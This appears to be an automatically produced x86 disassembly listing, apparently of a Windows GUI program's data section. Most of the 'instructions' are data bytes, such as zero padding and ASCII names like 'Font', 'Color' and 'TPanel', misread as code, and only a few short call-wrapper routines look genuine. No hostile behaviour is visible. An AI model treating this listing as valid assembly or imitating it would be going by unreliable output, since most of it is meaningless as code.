add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esi [ eax + 0x43 ]
cmpsb [ esi ] [ edi ]
add ecx [ edi ]
inc ebp
dec ecx
outsb
jbe r-xdata
popad
jo r-xdata
insb
imul esp [ edi + eax * 2 + 0x72 ] 0x69687061
arpl [ eax + 0x74 ] di
test al 0x3
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
js r-xdata
push esp
imul esp [ ebx + 0x4f ] 0x61726570
popad
bound ebp [ ebp + 0x7 ]
test al 0x3
or al 0x0
add [ eax ] al
mov [ esi - 0x59ba37fd ] es
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esi [ eax + 0x43 ]
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebp
dec ecx
outsb
jbe r-xdata
jb r-xdata
push 0x65737261
je r-xdata
outsd
outsb
lea eax [ eax ]
cwde
je r-xdata
je r-xdata
imul edi [ eax + 0x65 ] 0x72470864
popad
jo r-xdata
inc esi
outsd
insb
imul esp [ edi + eax * 2 + 0x72 ] 0x69687061
arpl [ edi + 0x70 ] cx
jb r-xdata
je r-xdata
imul ebp [ esi + 0x65 ] 0x5373660b
add [ eax ] al
add bh bh
add [ eax ] al
add [ eax + r-xdata ] dl
add ecx [ edx ]
push esp
inc esi
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
inc [ eax ]
add [ eax ] al
nop
or [ ebp - 0x58 ] dh
add eax [ ebx ]
or dl [ esi + eax * 2 + 0x6f ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x74 ] bh
add eax [ ebx ]
push ebx
insb
je r-xdata
or esp [ gs : esi + 0x73 ]
push ebx
outsb
je r-xdata
imul esp [ ebx + 0x73 ] 0xa874dc90
add ecx [ edx ]
or [ esi + eax * 2 + 0x6f ] edx
jae r-xdata
popad
insd
nop
in al dx
je r-xdata
je r-xdata
pop es
jo r-xdata
jo r-xdata
imul ebp [ ebx + 0x65 ] 0x874754f
inc edi
jb r-xdata
jae r-xdata
outsd
outsb
je r-xdata
imul esi [ ebx + 0x68 ] 0x1
add [ edx ] al
add [ eax ] al
add [ esp + esi * 2 + 0x660903a8 ] dl
jo r-xdata
or al 0x70
jae r-xdata
jo r-xdata
jne r-xdata
outsd
jae r-xdata
outsb
or dl [ esi + eax * 2 + 0x6f ]
outsb
je r-xdata
add [ eax + 0x303a874 ] bl
inc esi
add eax [ ecx ]
or al 0x54
or [ eax + 0x6d ] esi
inc ebx
insb
popad
jb r-xdata
add eax 0x6f4e6d70
inc esp
inc esp
outsd
je r-xdata
jo r-xdata
add al 0x75
test al 0x3
mov eax eax
jo r-xdata
je r-xdata
popa
jne r-xdata
add eax [ ebx ]
or [ eax + edx * 2 + 0x65 ] dl
outsb
popad
jae r-xdata
push 0x5657469
jo r-xdata
inc esp
popad
jae r-xdata
jns r-xdata
add ecx [ ebx - 0x578a8f40 ]
add eax [ ebx ]
or [ eax + edx * 2 + 0x65 ] edx
outsb
push es
jo r-xdata
jb r-xdata
insb
imul esp [ ebx + 0xb ] 0x6e557366
popad
je r-xdata
outsd
insb
imul esp [ esi + eax + 0x70 ] 0x73614473
push 0x44737005
outsd
insd
outsd
or esi [ eax + 0x73 ]
jo r-xdata
jo r-xdata
add eax 0x6f4e6d70
dec ebp
outsd
add [ gs : eax ] eax
add [ eax ] al
outsd
imul esp [ ebx + 0x73 ] 0x7558c08b
test al 0x3
push es
or edx [ esi + eax * 2 + 0x6f ]
outsb
je r-xdata
inc edi
jb r-xdata
push ebx
je r-xdata
test al 0x3
add ecx [ ecx ]
push esp
push eax
outsb
insb
or [ fs : esi + 0x73 ] ah
je r-xdata
add eax [ edi ]
jo r-xdata
dec esi
outsd
je r-xdata
jo r-xdata
dec esi
outsd
popad
arpl [ ebx + 0x7 ] bp
jo r-xdata
inc esp
outsd
add [ eax ] cl
add [ eax ] al
add [ ebp + esi * 2 - 0x58 ] ch
add eax [ edi ]
jo r-xdata
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ esi * 2 + 0x660603a8 ] al
jae r-xdata
push esp
push eax
outsb
insb
add [ gs : eax ] eax
add [ eax ] al
inc esp
popad
jae r-xdata
jae r-xdata
or [ edi + 0x72 ] al
popad
pop es
jb r-xdata
or edx [ edx + eax * 2 + 0x72 ]
jne r-xdata
or eax 0x654d6d70
jb r-xdata
jo r-xdata
jb r-xdata
jo r-xdata
dec ecx
outsb
jb r-xdata
inc ebx
outsd
jo r-xdata
push es
jo r-xdata
jae r-xdata
or eax 0x6e497370
je r-xdata
je r-xdata
jo r-xdata
jo r-xdata
pop es
jo r-xdata
je r-xdata
inc edx
insb
jae r-xdata
popad
jae r-xdata
insd
push edi
add [ edi ] cl
add [ eax ] al
add ah ch
jne r-xdata
sldt [ eax ]
je r-xdata
add eax 0x6f447370
push ebx
je r-xdata
push eax
outsb
dec esi
jo r-xdata
imul esp [ ebx + 0x73 ] 0xa875f090
or ah [ edx + 0x73 ]
push esi
jb r-xdata
bound esi [ ebx + 0x48 ]
push es
jo r-xdata
test al 0x3
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
bound esi [ ebx + 0x53 ]
outsd
insb
imul esp [ edi + eax + 0x62 ] 0x656c4373
popad
push 0x6c797453
push 0x8b736369
push eax
outsb
dec esi
outsd
je r-xdata
shr [ esi + esi * 2 + 0xb0303a8 ] 0x54
arpl [ ebx - 0x75 ] si
dec ebp
jb r-xdata
insd
je r-xdata
dec esi
outsd
je r-xdata
insd
inc esi
jb r-xdata
or [ edi + 0x72 ] al
popad
jo r-xdata
inc edx
jb r-xdata
imul esp [ ebx + 0x73 ] 0x76acc08b
test al 0x3
add ecx [ ebx ]
push esp
imul eax [ 0x6f586d70 ] 0x72
or [ eax + 0x6d ] dh
je r-xdata
dec esi
outsd
je r-xdata
insb
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
add al 0x75
test al 0x3
push es
jae r-xdata
popad
jb r-xdata
jae r-xdata
outsd
jb r-xdata
insb
add eax 0x6f586d70
or esp [ edx + 0x73 ]
inc edx
inc esp
imul esp [ ecx + 0x67 ] 0x6c616e6f
bound esi [ ebx + 0x46 ]
or [ eax + 0x6d ] esi
add [ eax ] al
add [ eax ] al
cwde
ja r-xdata
add [ gs : eax ] eax
add [ eax ] al
insb
or al 0x70
insd
dec ebp
popad
jae r-xdata
add [ eax ] al
add [ eax + 0x703a876 ] ch
dec ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esp [ edx + ebp * 4 - 0x544bfc59 ]
cmpsd [ esi ] [ edi ]
add edi [ ebx + ebp * 4 - 0x552ffc59 ]
cmpsd [ esi ] [ edi ]
inc esp
imul esp [ ebx + 0x61 ] 0x73620b6c
test al 0x3
sbb [ eax ] al
jpe r-xdata
inc esi
insb
or esp [ edx + 0x73 ]
dec ebp
popad
jae r-xdata
outsb
je r-xdata
add [ eax ] al
nop
jl r-xdata
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + esi * 2 - 0x58 ] bh
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x3a877 ] bl
jae r-xdata
or eax 0x654d6d70
jb r-xdata
jo r-xdata
outsd
je r-xdata
insb
or esi [ gs : eax + 0x73 ]
inc ecx
insb
jns r-xdata
push ebp
jae r-xdata
insd
or esi [ gs : eax + 0x73 ]
outsd
pop es
bound esi [ ebx + 0x43 ]
jb r-xdata
popad
insb
dec esi
outsd
je r-xdata
imul esp [ ecx + 0x67 ] 0x6c616e6f
outsd
jb r-xdata
or al 0x70
insd
jb r-xdata
dec ecx
je r-xdata
jo r-xdata
add eax [ ecx ]
add ch bh
jae r-xdata
jb r-xdata
bound esi [ ebx + 0x43 ]
insb
popad
dec esi
outsd
je r-xdata
add [ edi ] al
dec esi
outsd
je r-xdata
or [ edi + 0x72 ] al
popad
jo r-xdata
outsd
outsb
popad
add ecx eax
inc ebp
cmpsb [ esi ] [ edi ]
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsd [ esi ] [ edi ]
add eax [ edi + esi * 2 + 0x1803a8 ]
insb
jb r-xdata
dec ebp
popad
jo r-xdata
jb r-xdata
lea ebp [ eax + 0x47540f03 ]
or esp [ edx + 0x73 ]
inc esp
imul esp [ ecx + 0x67 ] 0x736f7243
jae r-xdata
mov eax eax
lodsb [ esi ]
jbe r-xdata
inc edi
jb r-xdata
popad
jo r-xdata
outsb
pop es
jo r-xdata
add eax [ ebx ]
outsb
add [ eax ] al
shl [ edi - 0x58 ] 0x3
and [ eax ] al
add [ eax ] al
add [ eax ] eax
std
imul esp [ ebx + 0x73 ] 0xffff0001
nop
inc esp
js r-xdata
add [ eax ] eax
imul esp [ ebx + 0x73 ] 0x656a624f
arpl [ eax + ebx * 4 + 0x77 ] si
test al 0x3
pop es
andps xmm0 [ edi + 0x72 ]
inc [ ebp + ecx * 4 + 0x540f03a8 ]
inc edi
jo r-xdata
pop eax
nop
inc edi
jb r-xdata
outsd
outsb
jo r-xdata
je r-xdata
imul esp [ ebx + 0x73 ] 0x656a624f
dec ebp
jb r-xdata
add [ eax ] 0x0
add [ eax + 0x48060002 ] al
js r-xdata
arpl [ eax + esi * 2 + 0x77 ] si
test al 0x3
add al 0x7d
dec edi
bound ebp [ edx + 0x65 ]
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x78 ] dl
test al 0x3
popad
imul esp [ ebx + 0x73 ] 0xa8777090
add ecx [ eax ]
add [ eax ] cl
inc edi
jb r-xdata
test al 0x3
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
bound edi [ eax - 0x58 ]
add ebp [ edx + 0x78 ]
test al 0x3
and al 0x0
push 0x78
jo r-xdata
dec esi
outsd
or dh [ gs : eax + 0x6d ]
add [ eax ] al
add ebp esp
xchg ebp eax
test al 0x3
hlt
add [ eax ] al
and al 0x77
test al 0x3
enter 0xa645 0x3
aam 0x45
add esp [ eax + eax ]
add eax [ edi ]
add eax 0x6e6f4654
je r-xdata
imul esp [ gs : edi + 0x68 ] 0xa874d874
add edi eax
add al [ eax ]
push es
dec eax
jo r-xdata
js r-xdata
dec eax
nop
test al 0x3
add eax 0x6e6f4654
add esp [ eax ]
add [ eax ] al
add [ ecx ] al
add ch bh
ja r-xdata
imul esp [ ebx + 0x73 ] 0xc08b0000
les esi [ edi - 0x58 ]
add ecx [ edi ]
cmovns eax [ ebx + 0x68 ]
popad
outsb
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ eax ] eax
add eax 0x6f6c6f43
jb r-xdata
js r-xdata
xchg esp eax
test al 0x3
adc [ ebp + 0x103a8 ] dl
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax [ eax ]
add al 0x4e
fdiv [ eax + ebp * 4 + 0x3 ]
clc
imul esp [ ebx + 0x73 ] 0x74e80008
test al 0x3
and al 0x96
test al 0x3
sub al 0x96
test al 0x3
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ eax ] al
pop es
inc ebx
push 0x65737261
je r-xdata
cmpsd [ esi ] [ edi ]
add eax [ eax ]
add [ eax ] cl
inc edi
jb r-xdata
add esi [ eax + edi * 2 - 0x58 ]
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x78 ] ah
test al 0x3
dec esi
outsd
je r-xdata
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
add ecx eax
inc ebp
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esp [ eax - 0x4bfc5770 ]
stosd [ edi ]
cmpsd [ esi ] [ edi ]
add edi [ ebx + ebp * 4 - 0x6f1bfc59 ]
test al 0x3
push cs
imul sp [ ebp + 0x72 ] 0x1134
cmpsb [ esi ] [ edi ]
add eax [ ecx ]
and [ ebx ] esp
mov dh 0x1f
cmpsd [ esi ] [ edi ]
inc esp
rcl [ ecx ] 0x1
sahf
xchg ebx eax
add [ eax ] ah
scasd [ edi ]
cmp eax 0x4708da82
jb r-xdata
popad
insd
cmp al 0x10
cmpsb [ esi ] [ edi ]
add ebx [ esi + edx * 4 - 0x58 ]
add esp [ esi + edx * 4 - 0x58 ]
add eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add al 0x0
or ecx [ edi + 0x72 ]
imul esp [ ebp + 0x6e ] 0x69746174
outsd
outsb
xchg esp eax
je r-xdata
adc [ esi - 0x576b3ffd ] ah
add ecx eax
xchg esp eax
test al 0x3
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmpsb [ esi ] [ edi ]
add edx esp
inc ebp
add edx [ edi + esi * 2 + 0x803a8 ]
or [ edi + 0x72 ] al
popad
je r-xdata
push esp
inc esi
outsd
outsb
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add al al
ja r-xdata
add ecx [ esi ]
jo r-xdata
add ebx [ eax ]
add [ eax ] al
jmp [ eax ]
sub_3a87b6f
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xffffff ] al
add [ eax ] al
add eax 0x6f6c6f43
jb r-xdata
add ebx [ eax ]
add [ eax ] al
nop
jl r-xdata
test al 0x3
jbe r-xdata
add ecx eax
add [ eax ] al
jae r-xdata
mov ah 0xab
add edx [ esp + ebx * 4 - 0x58 ]
add ebx [ esp + ebx * 4 - 0x58 ]
add eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] eax
add eax 0x6c797453
lea eax [ eax ]
test al 0x7b
test al 0x3
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jns r-xdata
jae r-xdata
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah cl
jpo r-xdata
nop
cld
jpe r-xdata
jb r-xdata
outsd
jo r-xdata
inc ebp
jpo r-xdata
add al [ eax ]
mov eax 0x1803a873
fwait
test al 0x3
and [ ebx + 0x103a8 ] bl
add [ eax ] al
add [ eax ] al
add ah bh
add eax [ edi ]
push es
push esp
inc edx
jb r-xdata
popad
jae r-xdata
imul ebp [ fs : esi + 0x67 ] 0x61724708
jo r-xdata
test al 0x3
or al 0x0
add bh bh
add [ eax ] al
add [ eax ] al
add eax [ edi ]
pop es
push esp
inc ebx
popad
outsb
jbe r-xdata
outsd
insb
jne r-xdata
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
jpo r-xdata
jae r-xdata
push eax
mov eax [ eax ]
mov eax [ eax + 0x58 ]
jb r-xdata
add [ gs : bp + di ] cl
push eax
jb r-xdata
push ebx
je r-xdata
push esp
push edx
arpl [ gs : edx + eax + 0x3 ] si
dec ebp
imul esp [ ebx + 0x73 ] r-xdata
or [ esi ] cl
push esp
push eax
jb r-xdata
add al [ eax ]
add al 0x46
outsd
outsb
je r-xdata
jns r-xdata
pop esp
mov [ 0x103a8 ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
jae r-xdata
outsb
jpe r-xdata
add eax [ ecx + ebx * 4 ]
test al 0x3
or al 0x99
test al 0x3
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al [ eax ]
add eax 0x6c797453
cmp al 0x10
cmpsb [ esi ] [ edi ]
add edi [ ecx + ebx * 4 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
cmpsd [ esi ] [ edi ]
add edi [ ebx + ebp * 4 - 0x661ffc59 ]
test al 0x3
push es
push esp
inc edx
jb r-xdata
add ebx [ eax ]
add [ eax ] al
add [ edi + esi * 2 ] ah
test al 0x3
enter 0xa645 0x3
aam 0x45
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add edi [ eax - 0x4bfc5767 ]
stosd [ edi ]
int3
in al 0x7a
test al 0x3
xchg esp eax
ja r-xdata
xchg [ esp ] eax
jae r-xdata
xchg [ esp ] eax
inc eax
pop eax
outsb
je r-xdata
push cs
add [ gs : bx + si ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ esp + edi * 2 - 0x58 ] ch
add ecx [ edx ]
jo r-xdata
test al 0x3
ja r-xdata
push es
cmpsb [ esi ] [ edi ]
add ebp [ esp + edi * 2 - 0x58 ]
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42050000 ] al
jb r-xdata
add edx [ eax ]
add [ eax ] al
[ edx - 0x58 ]
inc ebp
cmpsb [ esi ] [ edi ]
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
test al 0x3
jpo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
jns r-xdata
add eax [ eax + eax ]
or [ edi + 0x72 ] al
popad
jo r-xdata
add [ eax ] al
add [ eax ] al
add al dh
jpe r-xdata
add eax [ edx ]
add [ eax ] cl
inc edi
jb r-xdata
retn
push ebx
je r-xdata
add [ eax + edx - 0x336ffc5a ] dl
add eax 0xffffffdc
push eax
outsd
outsb
add al 0x42
jns r-xdata
or [ edx + 0x65 ] edx
jb r-xdata
push ebx
je r-xdata
add edx eax
test al 0x3
inc ebp
add [ eax ] al
mov [ 0x7ab8cd12 ] eax
aam 0x11
sbb edx 0x0
ror [ edi + 0x60 ] 0xb2
fld [ ebp + edi * 2 + 0x2403a8 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x7e
test al 0x3
cwde
jge r-xdata
jb r-xdata
jae r-xdata
popad
jae r-xdata
pop eax
add [ eax ] al
add [ eax - 0x37fc5884 ] dl
add eax [ edi * 2 + 0x403a7 ]
or [ edi + 0x72 ] al
popad
jo r-xdata
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53040006 ] al
add ebx [ eax + eax ]
add [ eax ] al
and al 0x77
test al 0x3
enter 0xa645 0x3
aam 0x45
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add ebx eax
xchg esi eax
test al 0x3
inc esp
cdq
test al 0x3
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
add eax [ eax ]
add eax 0x74646957
push 0x7ae4c08b
test al 0x3
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cld
cmp al 0x99
imul esp [ ebx + 0x73 ] 0x73b80004
test al 0x3
and [ eax - 0x67d7fc58 ] bl
test al 0x3
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
retn
add al 0x24
add [ gs : ecx ] cl
push edx
jb r-xdata
jmp [ eax + 0xc ]
ja r-xdata
jb r-xdata
jb r-xdata
stosb [ edi ]
cmpsd [ esi ] [ edi ]
add eax [ ebp * 4 - 0x46e7fc59 ]
test al 0x3
dec eax
xor al 0xa6
add edx esp
mov ecx 0x344803a8
cmpsb [ esi ] [ edi ]
add ecx [ eax + 0x34 ]
cmpsb [ esi ] [ edi ]
add esp [ eax ]
mov ebx 0xbb2403a8
test al 0x3
dec eax
xor al 0xa6
add ebp [ ebx + edi * 4 + 0x344803a8 ]
cmpsb [ esi ] [ edi ]
add edx [ eax ]
mov esp 0xbc3003a8
test al 0x3
dec eax
xor al 0xa6
cmpsd [ esi ] [ edi ]
add ecx [ eax - 0x2ffc5747 ]
test al 0x3
sub al 0xbb
test al 0x3
mov eax 0x4803a8bb
xor al 0xa6
add ecx [ eax + 0x34 ]
cmpsb [ esi ] [ edi ]
add ecx [ eax + 0x34 ]
cmpsb [ esi ] [ edi ]
add ecx [ eax + 0x34 ]
cmpsb [ esi ] [ edi ]
add edx [ esp + edi * 4 ]
test al 0x3
add [ eax ] eax
std
inc [ eax + 0x803a8bb ]
push esp
inc edi
jb r-xdata
mov eax [ eax ]
mov eax [ eax + 0x54 ]
add [ eax ] al
add [ eax ] al
xchg esp eax
add edx [ edx + 0x7d ]
test al 0x3
add [ eax ] eax
add al 0x8b
add bh bh
pushad
or al 0x83
inc esp
and al 0x4
fsub st1
dec ebp
das
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + edi * 2 + 0x3a8 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
jle r-xdata
jge r-xdata
add edx [ eax + edx - 0x5a ]
outsb
add [ si ] dl
adc [ esi - 0x578393fd ] esp
add eax [ eax ]
adc [ esi + 0x3 ] ah
inc ebp
jbe r-xdata
push esp
push eax
jb r-xdata
cmp al 0x10
cmpsb [ esi ] [ edi ]
add esp [ eax ]
add [ eax ] al
jmp [ eax ]
imul esp [ ebx + 0x73 ] 0x7af80004
test al 0x3
adc al 0x0
add bh bh
js r-xdata
imul edi [ edx + 0x65 ] r-xdata
test al 0x95
test al 0x3
mov ah 0x95
test al 0x3
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop es
add [ 0x6c797453 ] al
nop
in al 0x79
test al 0x3
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cld
push eax
imul esi [ ebx + 0x68 ] r-xdata
insb
xchg ebp eax
test al 0x3
mov [ ebp + 0x3a8 ] dl
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push es
add [ ebx + edx * 2 ] al
add eax [ eax ]
add [ eax ] al
add [ eax ] al
jns r-xdata
add [ eax ] al
add [ eax ] al
add ah bh
in al 0x79
test al 0x3
xchg esp eax
ja r-xdata
add eax [ edi ]
add al 0x54
push eax
outsb
add [ eax ] al
add eax 0x6f6c6f43
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
jne r-xdata
sar [ ebx - 0x58 ] 0x3
imul esp [ ebx + 0x73 ] 0x73b80002
test al 0x3
sbb [ ebx - 0x64dffc58 ] bl
test al 0x3
add [ eax ] eax
outsd
imul ebp [ esi + 0x67 ] 0x52737009
jne r-xdata
mov ch 0x7e
test al 0x3
retn
jo r-xdata
add esi [ esi + edi * 2 - 0x58 ]
add ebp [ eax ]
add [ eax ] al
add [ eax - 0x37fc5883 ] al
inc ebp
cmpsb [ esi ] [ edi ]
add esi [ esp + ebp * 4 - 0x59 ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esp [ edx + ebp * 4 - 0x544bfc59 ]
adc al 0x11
outsb
je r-xdata
outsd
jb r-xdata
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esi [ ebp + ebx * 4 - 0x58 ]
add esi [ ebx + ebp * 4 - 0x5443fc59 ]
cmpsd [ esi ] [ edi ]
add edx eax
stosb [ edi ]
cmpsd [ esi ] [ edi ]
add ebp [ eax - 0x6bfc575c ]
movsb [ edi ] [ esi ]
test al 0x3
les esp [ ebx + 0x540703a8 ]
inc ebx
popad
outsb
jbe r-xdata
test al 0x3
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ eax ] al
add eax 0x73757242
push r-xdata
and [ eax ] al
add bh bh
and [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0xcc0020 ] al
add [ eax ] eax
or [ ebx + 0x6f ] al
jo r-xdata
test al 0x3
mov ah 0xab
cmpsd [ esi ] [ edi ]
add edi [ ebx + ebp * 4 - 0x68fffc59 ]
test al 0x3
add al 0x54
push eax
outsb
lea eax [ eax ]
cld
jns r-xdata
add ebx [ eax ]
add [ eax ] al
push eax
cwde
test al 0x3
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x4 ] al
add [ eax ] eax
add al 0x4d
adc al [ ecx ]
push edx
add eax 0x63655254
je r-xdata
inc edx
outsd
outsd
insb
popad
outsb
ja r-xdata
outsb
imul ebp [ esi + 0x67 ] 0x45737008
jle r-xdata
imul esp [ ebx - 0x73 ] 0x7e840040
test al 0x3
pop es
or [ edi + eax * 2 + 0x72 ] dl
popad
jo r-xdata
push es
or [ esi ] al
push ebx
outsb
jb r-xdata
outsb
or [ eax + 0x73 ] dh
inc ebp
dec ebp
jae r-xdata
jae r-xdata
add ecx [ ebp + 0x73 ]
push es
arpl [ esi + edi * 2 ] ax
test al 0x3
add al 0x7e
cmpsd [ esi ] [ edi ]
add esp [ ebp - 0x52fc5782 ]
jle r-xdata
int 0xb8
jpe r-xdata
imul esp [ ebx + 0x4 ] 0x403a87e
jle r-xdata
push esp
push eax
jb r-xdata
add [ 0x67617453 ] al
push cs
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
push ebx
je r-xdata
ror [ edi + 0x60 ] 0xb2
fstp st2
jle r-xdata
jo r-xdata
add eax [ eax ]
add [ eax ] cl
inc edi
jb r-xdata
add eax [ ecx ]
add [ eax ] al
add [ ebx + 0x7ab8cd12 ] ah
aam 0x11
test al 0x3
pushfd
jg r-xdata
sbb edx 0x0
aam 0x11
add eax [ eax - 0x44 ]
test al 0x3
loopne r-xdata
adc [ eax + ebp * 4 - 0x5743cffd ] bh
add ecx [ eax + 0x34 ]
cmpsb [ esi ] [ edi ]
adc [ esi - 0x7c336ffd ] ah
rcr ah 0x50
add eax 0xffffffd8
jmp r-xdata
add ebp [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx - 0x5780a340 ] cl
sub [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax eax
pop esp
jg r-xdata
imul esp [ ebx + 0x73 ] 0xcc900000
add eax 0xffffffd8
jmp r-xdata
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x7f ] bh
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_3a8c248
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x58 ]
pop edi
pop esi
retn
add bh bh
pushad
or al 0x83
inc esp
and al 0x4
fsubr st1
imul [ 0x4483ffff ]
and al 0x4
fsubr st1
or eax 0xccffff2e
int3
add eax [ eax ]
add [ eax ] al
add [ edi + edi * 2 - 0x58 ] ch
add ebx [ edi + edi * 2 + 0x3a8 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
jle r-xdata
inc esp
and al 0x4
mov eax [ eax ]
jmp [ eax + 0xc ]
add ebp esi
jle r-xdata
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_3a8c248
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
pop esi
pop ebx
retn
add eax [ eax ]
add [ eax ] cl
inc edi
jb r-xdata
test al 0x3
insd
popad
lea eax [ bx + si ]
push 0x3a880
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax * 4 - 0x58 ] ch
add esp [ eax + eax ]
add [ eax ] al
jo r-xdata
add eax [ ebp * 4 - 0x46e7fc59 ]
test al 0x3
pushfd
imul bp [ ebp + 0x49 ] 0x616d
nop
enter 0xa880 0x3
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
